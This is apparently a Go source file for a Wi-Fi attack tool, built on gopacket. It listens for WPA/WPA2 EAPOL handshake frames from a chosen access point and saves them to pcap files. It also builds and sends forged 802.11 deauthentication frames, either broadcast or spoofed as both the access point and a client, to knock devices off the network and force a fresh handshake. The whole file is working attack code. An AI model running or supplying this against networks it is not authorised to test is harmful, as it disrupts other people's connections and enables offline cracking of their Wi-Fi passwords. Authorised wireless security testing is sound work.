package capture

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/pcapgo"
)

// Capture handles packet capture operations
type Capture struct {
	iface     string
	outputDir string
}

func New(iface, outputDir string) *Capture {
	if outputDir == "" {
		outputDir = "data/captures"
	}
	os.MkdirAll(outputDir, 0755)
	return &Capture{
		iface:     iface,
		outputDir: outputDir,
	}
}

// CaptureHandshake listens for WPA/WPA2 handshake packets from a target BSSID
func (c *Capture) CaptureHandshake(bssid, ssid string) (string, error) {
	handle, err := pcap.OpenLive(c.iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return "", fmt.Errorf("failed to open interface %s: %w", c.iface, err)
	}
	defer handle.Close()

	// Determine output filename
	name := bssid
	if ssid != "" {
		name = fmt.Sprintf("%s_%s", sanitizeName(ssid), bssid)
	}
	timestamp := time.Now().Format("20060102_150405")
	outPath := filepath.Join(c.outputDir, fmt.Sprintf("handshake_%s_%s.pcap", name, timestamp))

	outFile, err := os.Create(outPath)
	if err != nil {
		return "", fmt.Errorf("failed to create capture file: %w", err)
	}
	defer outFile.Close()

	writer := pcapgo.NewWriter(outFile)
	writer.WriteFileHeader(65536, layers.LinkTypeIEEE80211Radio)

	eapolCount := 0
	handshakeFrames := make(map[int]bool)
	fmt.Println("[*] Listening for EAPOL frames (WPA handshake)...")

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		dot11 := packet.Layer(layers.LayerTypeDot11)
		if dot11 == nil {
			continue
		}

		d11, _ := dot11.(*layers.Dot11)
		if d11 == nil {
			continue
		}

		// Only capture frames involving our target
		if !macMatches(d11.Address1, bssid) &&
			!macMatches(d11.Address2, bssid) &&
			!macMatches(d11.Address3, bssid) {
			continue
		}

		// Look for EAPOL (EAP over LAN = WPA handshake)
		eapol := packet.Layer(layers.LayerTypeEAPoL)
		if eapol != nil {
			eapolCount++
			// Determine handshake frame number from EAPOL key info
			frameNum := detectEAPOLFrame(packet)
			if frameNum > 0 {
				handshakeFrames[frameNum] = true
				fmt.Printf("\r[+] Captured EAPOL frame %d (total: %d) | Frames: %v    ",
					frameNum, eapolCount, mapKeys(handshakeFrames))
			}
		}

		// Write packet to capture file
		writer.WritePacket(packet.Metadata().CaptureInfo, packet.Data())

		// Check if we have a complete handshake (frames 1,2,3,4 or at least 2+3)
		if hasCompleteHandshake(handshakeFrames) {
			fmt.Printf("\n[+] Complete WPA handshake captured!\n")
			return outPath, nil
		}
	}

	if eapolCount == 0 {
		return "", fmt.Errorf("no EAPOL frames captured - try with --deauth flag")
	}

	return outPath, nil
}

// SendDeauth sends 802.11 deauthentication frames
func (c *Capture) SendDeauth(bssid, clientMAC string, count int) error {
	handle, err := pcap.OpenLive(c.iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("failed to open interface: %w", err)
	}
	defer handle.Close()

	target := clientMAC
	if target == "" {
		target = "ff:ff:ff:ff:ff:ff" // Broadcast deauth
	}

	for i := 0; i < count; i++ {
		// Build deauth frame: to client (AP impersonation)
		pkt1 := buildDeauthPacket(bssid, target, bssid)
		if err := handle.WritePacketData(pkt1); err != nil {
			return fmt.Errorf("failed to send deauth packet: %w", err)
		}

		// Build deauth frame: to AP (client impersonation)
		if target != "ff:ff:ff:ff:ff:ff" {
			pkt2 := buildDeauthPacket(target, bssid, bssid)
			handle.WritePacketData(pkt2)
		}

		time.Sleep(10 * time.Millisecond)
	}
	return nil
}

// buildDeauthPacket constructs a raw 802.11 deauthentication packet
func buildDeauthPacket(src, dst, bssid string) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	srcMAC := parseMAC(src)
	dstMAC := parseMAC(dst)
	bssidMAC := parseMAC(bssid)

	dot11 := &layers.Dot11{
		Type:     layers.Dot11TypeMgmtDeauthentication,
		Address1: dstMAC,
		Address2: srcMAC,
		Address3: bssidMAC,
	}

	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11ReasonClass2FromNonAuth,
	}

	gopacket.SerializeLayers(buf, opts, dot11, deauth)
	return buf.Bytes()
}

func detectEAPOLFrame(packet gopacket.Packet) int {
	eapol := packet.Layer(layers.LayerTypeEAPoL)
	if eapol == nil {
		return 0
	}

	payload := eapol.LayerPayload()
	if len(payload) < 4 {
		return 0
	}

	// EAPOL-Key packet type = 3
	if payload[0] != 3 {
		return 0
	}

	if len(payload) < 6 {
		return 0
	}

	keyInfo := uint16(payload[5])<<8 | uint16(payload[4])
	ack := (keyInfo & 0x0080) != 0
	install := (keyInfo & 0x0040) != 0
	mic := (keyInfo & 0x0100) != 0
	secure := (keyInfo & 0x0200) != 0

	switch {
	case ack && !mic && !secure:
		return 1 // Frame 1: ANonce
	case !ack && mic && !secure:
		return 2 // Frame 2: SNonce + MIC
	case ack && mic && install && secure:
		return 3 // Frame 3: GTK
	case !ack && mic && secure && !install:
		return 4 // Frame 4: ACK
	}
	return 0
}

func hasCompleteHandshake(frames map[int]bool) bool {
	// Minimum viable handshake: frames 2 and 3
	return (frames[1] && frames[2]) || (frames[2] && frames[3]) || (frames[1] && frames[2] && frames[3] && frames[4])
}

func macMatches(hwAddr interface{ String() string }, mac string) bool {
	return hwAddr.String() == mac
}

func mapKeys(m map[int]bool) []int {
	keys := make([]int, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func sanitizeName(s string) string {
	result := ""
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
			result += string(r)
		}
	}
	return result
}

func parseMAC(s string) []byte {
	mac := make([]byte, 6)
	fmt.Sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
		&mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5])
	return mac
}
